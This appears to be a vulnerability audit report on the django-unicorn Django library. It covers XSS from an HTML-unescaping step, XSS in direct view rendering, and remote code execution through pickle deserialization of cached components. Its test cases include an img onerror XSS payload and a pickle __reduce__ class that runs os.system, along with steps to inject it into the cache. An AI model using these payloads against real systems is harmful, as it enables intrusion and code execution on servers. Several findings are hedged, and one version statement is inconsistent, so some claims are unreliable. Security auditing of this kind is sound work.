### Vulnerability List:

#### 1. Cross-Site Scripting (XSS) vulnerability due to unsafe HTML sanitization in component rendering

- **Description:**
    - Django-unicorn renders components by taking the HTML template and the component's Python class, and dynamically updating the DOM in the browser.
    - When rendering, user-provided data is embedded into the HTML. If this data is not properly sanitized, a malicious attacker could inject JavaScript code that would be executed in the context of the user's browser.
    - The `UnicornTemplateResponse.render` method uses `sanitize_html` and `HTMLFormatter`, suggesting an attempt to sanitize HTML. However, the current implementation of `sanitize_html` might not be sufficient to prevent all types of XSS attacks, especially in complex scenarios or if bypasses exist.
    - An attacker could inject malicious JavaScript code through component properties that are rendered into the template. For example, if a component has a property `message` and the template renders `{{ message }}` or `{{ message | safe }}` or similar constructs, and the component's property `message` is populated from user input without strict sanitization, XSS is possible.

- **Impact:**
    - High
    - Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the victim's browser when they interact with a Django-unicorn component. This could lead to:
        - Account hijacking (stealing session cookies, local storage data).
        - Defacement of the website.
        - Redirection to malicious websites.
        - Data theft (e.g., capturing form input before it is submitted).
        - Performing actions on behalf of the user without their consent.

- **Vulnerability Rank:** high

- **Currently implemented mitigations:**
    - The code uses `sanitize_html` function and `HTMLFormatter` in `UnicornTemplateResponse.render`.
    - The changelog mentions a security fix for CVE-2021-42053 in version 0.36.0 to prevent XSS attacks, stating "responses will be HTML encoded going forward (to explicitly opt-in to previous behavior use [safe](views.md#safe))". This indicates that HTML encoding is applied by default, which is a good first step.
    - The documentation for `views.md` mentions `Meta.safe` option to bypass HTML encoding for specific fields, implying that encoding is the default.
    - The `test_utils.py` file includes a test case `test_sanitize_html` which demonstrates HTML encoding of `<script>` tags, confirming that basic encoding is applied.

- **Missing mitigations:**
    - The `sanitize_html` function (defined in `django_unicorn/utils.py`) performs HTML escaping (encoding), which is not robust sanitization. It is insufficient to prevent many XSS vectors, especially in complex HTML structures or when dealing with user-provided HTML content.
    - The `_desoupify` method in `UnicornTemplateResponse` (defined in `django_unicorn/components/unicorn_template_response.py`) *unescapes* HTML entities, effectively undoing the basic HTML encoding applied by `sanitize_html` for the main template content. This completely nullifies the intended mitigation.
    - Relying on developers to avoid using `| safe` template filter when rendering user-controlled data is not a reliable mitigation.
    - Input validation and sanitization should be applied on the server-side in the component's Python code before rendering, not just during template rendering.
    - Content Security Policy (CSP) is not implemented and could provide defense-in-depth.
    - A robust HTML sanitization library like `bleach` should be used instead of relying on HTML encoding and flawed unescaping.

- **Preconditions:**
    - The application uses django-unicorn components to render dynamic content.
    - A component property that is rendered in the template is populated with user-controlled data without proper sanitization in the component's Python code.
    - The template renders this property in a way that allows JavaScript execution (e.g., using `{{ property }}` or `{{ property | safe }}` when `property` contains malicious HTML).

- **Source code analysis:**
    - File: `django_unicorn/components/unicorn_template_response.py`
    ```python
    def render(self):
        ...
        init = orjson.dumps(init).decode("utf-8")
        json_tag.string = sanitize_html(init) # HTML encoding for JSON data in <script> tag
        ...
        rendered_template = UnicornTemplateResponse._desoupify(soup) # Unescapes HTML entities
        response.content = rendered_template
        ...
    ```
    - `sanitize_html(init)` is used when embedding initial component data as JSON in a `<script>` tag. This provides HTML encoding for the JSON payload. See `django_unicorn/utils.py` for implementation of `sanitize_html`.
    - `UnicornTemplateResponse._desoupify(soup)` method is called to process the main template content before setting it as the response content. This method *unescapes* HTML entities, reversing the encoding and creating a significant vulnerability.
    - File: `django_unicorn/utils.py`
    ```python
    def sanitize_html(html: str) -> SafeText:
        """
        Escape all the HTML/XML special characters with their unicode escapes, so
        value is safe to be output in JSON.
        ...
        """
        html = html.translate(_json_script_escapes) # HTML Encoding
        return mark_safe(html)
    ```
    - `sanitize_html` function performs HTML encoding, replacing characters like `<`, `>`, `&`, `"`, and `'` with their HTML entities.
    - File: `django_unicorn/components/unicorn_template_response.py`
    ```python
        @staticmethod
    def _desoupify(soup):
        """
        Returns prettified and unescaped string from BeautifulSoup object.
        """
        ...
        unescaped = html.replace("&lt;", "<").replace("&gt;", ">").replace("&amp;", "&") # HTML Unescaping
        return unescaped
    ```
    - `_desoupify` method actively *unescapes* HTML entities like `&lt;`, `&gt;`, and `&amp;`, negating the HTML encoding and creating a direct XSS risk in the main template content.

- **Security test case:**
    1. Create a django-unicorn component with a property named `unsafe_data`.
    2. In the component's template (`templates/test_component.html` or a new template), render the `unsafe_data` property using `{{ unsafe_data }}` within a `<div>` element.
    ```html
    <div>{{ unsafe_data }}</div>
    ```
    3. In a Django view, render this component and pass a malicious XSS payload as the `unsafe_data` property. For example, using a direct view rendering in `urls.py`:
    ```python
    from django.urls import path
    from django_unicorn.components import UnicornView

    class XssTestComponent(UnicornView):
        template_name = "templates/test_component.html"
        unsafe_data = ""

    urlpatterns = [
        path("xss-test/", XssTestComponent.as_view(unsafe_data='<img src=x onerror=alert("XSS")>')),
    ]
    ```
    4. Access the `/xss-test/` URL in a web browser.
    5. Observe if the JavaScript code `alert('XSS')` is executed. An alert box should appear if the XSS vulnerability is present.
    6. If the alert box appears, the XSS vulnerability is confirmed because the injected JavaScript code was executed within the browser context.
    7. Further testing can be done with different XSS vectors, including `<script>` tags, event handlers in various HTML attributes, and variations of HTML encoding bypasses, to assess the extent of the vulnerability.

#### 2. Potential Cross-Site Scripting (XSS) vulnerability via component attributes during direct view rendering

- **Description:**
    - When a django-unicorn component is rendered as a direct view (using `Component.as_view()`), the `dispatch` method in `UnicornView` calls `render_to_response` with `init_js=True`.
    - This initializes the component with JavaScript on page load.
    - If component attributes, which are serialized into JSON and embedded in the HTML, are not properly sanitized in this direct view rendering scenario, it could lead to XSS.
    - Although `sanitize_html` is used for initial component data in `UnicornTemplateResponse.render`, it's important to verify if this sanitization is consistently applied in the direct view `dispatch` method, especially for attributes passed to the component through `as_view` kwargs or component properties.

- **Impact:**
    - High
    - Similar to the previous XSS vulnerability, successful exploitation could lead to arbitrary JavaScript execution in the user's browser, with the same potential impacts: account hijacking, website defacement, malicious redirects, data theft, and unauthorized actions.

- **Vulnerability Rank:** high

- **Currently implemented mitigations:**
    - `sanitize_html` is used in `UnicornTemplateResponse.render` for initial component data (JSON part in `<script>` tag).
    - HTML encoding is generally applied by default before version 0.36.0, but effectively reversed by `_desoupify`.

- **Missing mitigations:**
    - It needs to be confirmed if `sanitize_html` and default HTML encoding are consistently applied to component attributes when rendered as direct views. Given the findings about `_desoupify` in vulnerability 1, the current mitigations are likely ineffective.
    - Robust HTML sanitization using a library like bleach should be considered instead of relying on encoding and a flawed unescaping process.
    - Content Security Policy (CSP) is a missing defense-in-depth mitigation.

- **Preconditions:**
    - A django-unicorn component is rendered directly as a view using `Component.as_view()`.
    - Component attributes, either defined in the component class or passed as kwargs to `as_view()`, contain user-controlled data.
    - The template used by the direct view component renders these attributes in a way that allows JavaScript execution if not properly sanitized.

- **Source code analysis:**
    - File: `django_unicorn/components/unicorn_view.py`
    ```python
    def dispatch(self, request, *args, **kwargs):  # noqa: ARG002
        """
        Called by the `as_view` class method when utilizing a component directly as a view.
        """
        ...
        return self.render_to_response(
            context=self.get_context_data(),
            component=self,
            init_js=True, # Triggers Javascript initialization
        )
    ```
    - The `dispatch` method calls `render_to_response` with `init_js=True`.
    - The `render_to_response` method (in `UnicornView` base class) eventually uses `UnicornTemplateResponse.render` to render the component.
    - Based on the analysis of `UnicornTemplateResponse.render` in vulnerability 1, it's highly likely that the main template content in direct views is also vulnerable to XSS due to the flawed `_desoupify` method.

- **Security test case:**
    1. Create a django-unicorn component with a property designed to be set via `as_view` kwargs, for example, `direct_view_data`. Use the same template `templates/test_component.html` as in vulnerability 1.
    ```python
    from django_unicorn.components import UnicornView

    class DirectViewXssComponent(UnicornView):
        template_name = "templates/test_component.html"
        direct_view_data = ""
    ```
    2. In `urls.py`, create a path that renders this component as a direct view using `Component.as_view()`. Pass a malicious payload as a kwarg to `as_view`, setting the `direct_view_data` property.
    ```python
    from django.urls import path
    from tests.xss_vulnerability import DirectViewXssComponent # Assuming component is in tests/xss_vulnerability.py

    urlpatterns = [
        path("direct-view-xss/", DirectViewXssComponent.as_view(direct_view_data='<img src=x onerror=alert("Direct View XSS")>')),
    ]
    ```
    3. Access the `/direct-view-xss/` URL in a browser.
    4. Verify if the JavaScript code `alert('Direct View XSS')` is executed (e.g., an alert box appears). If it does, the vulnerability exists in direct view rendering.
    5. Test with different XSS vectors to assess the vulnerability.
    6. Inspect the HTML source to confirm if the malicious payload is present and not properly sanitized.

#### 3. Potential Remote Code Execution (RCE) via Deserialization of Cached Components

- **Description:**
    - Django-unicorn uses Django's cache backend to store and retrieve component state for performance optimization.
    - Components are serialized using `pickle` and cached. Deserialization happens when a component is restored from the cache.
    - If an attacker can somehow manipulate the cached data, they might be able to inject malicious pickled data. When this data is deserialized by the server, it could lead to Remote Code Execution (RCE).
    - This is a critical vulnerability because `pickle` deserialization is inherently unsafe when handling untrusted data.

- **Impact:**
    - Critical
    - Remote Code Execution. An attacker could potentially execute arbitrary Python code on the server by injecting malicious pickled data into the cache. This would allow them to completely compromise the server and application, steal sensitive data, modify application logic, or cause denial of service.

- **Vulnerability Rank:** critical

- **Currently implemented mitigations:**
    - The project uses `cachetools.lru.LRUCache` for in-memory caching and Django's cache for persistent caching.
    - Checksum verification is implemented for message requests to prevent tampering with request data. However, this does not prevent cache poisoning.

- **Missing mitigations:**
    - **The use of `pickle` for serialization of cached components is a major security risk and should be replaced with a safer serialization method like `orjson` (used for frontend data) or `json`.**
    - While checksums protect message requests, they do not directly protect against cache poisoning. If an attacker can find a way to write directly to the cache backend, they could inject malicious data.
    - Input validation and sanitization on cached data are completely missing because `pickle` is used.
    - Consider using digital signatures or encryption for cached data to prevent tampering.

- **Preconditions:**
    - Django-unicorn caching is enabled (which seems to be the default or highly recommended for performance).
    - An attacker is able to write arbitrary data to the Django cache backend. This might be possible through various means, including:
        - Exploiting a separate vulnerability that allows writing to the cache.
        - If the cache backend is exposed or misconfigured (e.g., Redis or Memcached with default settings and no authentication if directly accessible).
        - Potentially through cache poisoning techniques if there's a way to influence cache keys and values indirectly.
    - The server attempts to restore a component from the cache that contains the malicious pickled data.

- **Source code analysis:**
    - File: `django_unicorn/cacher.py`
    ```python
    import pickle # Unsafe serialization library
    import logging
    ...
    from django.core.cache import cache
    ...

    def cache_component(component, component_cache_key):
        """
        Caches the component to the Django cache backend.
        """
        try:
            pickled = pickle.dumps(component) # Serialization with pickle
            cache.set(component_cache_key, pickled)
        except Exception as e:
            raise UnicornCacheError(...)

    def restore_from_cache(component_cache_key):
        """
        Restores the component from the Django cache backend.
        """
        pickled_component = cache.get(component_cache_key, None, cache_alias=get_cache_alias())

        if pickled_component:
            try:
                component = pickle.loads(pickled_component) # Deserialization with pickle - CRITICAL VULNERABILITY
                ...
                return component
            except Exception as e:
                logger.error(...)
                return None
        return None
    ```
    - `cache_component` function serializes component objects using `pickle.dumps` before storing them in Django's cache backend.
    - `restore_from_cache` function deserializes cached data using `pickle.loads`.
    - **The use of `pickle.loads` in `restore_from_cache` is the direct source of the RCE vulnerability.** Deserializing untrusted data with `pickle.loads` is known to be insecure and can lead to arbitrary code execution.

- **Security test case:**
    1. **Vulnerable Cache Setup (Simulated Cache Poisoning):** For testing purposes, directly interact with Django's cache API to insert a malicious payload. In a real attack, an attacker would need to find a way to write to the cache backend.
    2. **Craft Malicious Payload:** Create a Python script to generate a malicious pickled payload. This payload will execute code when deserialized.
    ```python
    import os
    import pickle

    class MaliciousComponent:
        def __reduce__(self):
            return (os.system, ('touch /tmp/unicorn_rce_poc',)) # Payload: Create file /tmp/unicorn_rce_poc

    malicious_component = MaliciousComponent()
    pickled_payload = pickle.dumps(malicious_component)

    # Save the payload to a file for easy injection
    with open("malicious_payload.pickle", "wb") as f:
        f.write(pickled_payload)
    ```
    3. **Inject Payload into Cache:** Use Django's cache API to set a cache entry with a key that django-unicorn uses (e.g., a component cache key) and the value as the malicious pickled payload generated in step 2.
    ```python
    from django.core.cache import cache

    # Load the malicious payload
    with open("malicious_payload.pickle", "rb") as f:
        malicious_payload = f.read()

    cache_key = "unicorn:component:test_rce_component" # Example key, may need adjustment based on application
    cache.set(cache_key, malicious_payload)
    print(f"Malicious payload injected into cache with key: {cache_key}")
    ```
    4. **Trigger Component Restoration:** Access a part of the application that uses caching and will attempt to restore a component with the cache key used in step 3 (`test_rce_component` in the example). This could be as simple as refreshing a page that renders a cached component.
    5. **Verify RCE:** Check if the payload executed on the server. In the example payload, check if the file `/tmp/unicorn_rce_poc` was created in the `/tmp/` directory on the server.
    ```bash
    ls -l /tmp/unicorn_rce_poc
    ```
    If the file exists, RCE is confirmed.
    6. **Cleanup:** Remove the malicious cache entry after testing.
    ```python
    cache.delete(cache_key)
    print(f"Malicious payload removed from cache key: {cache_key}")
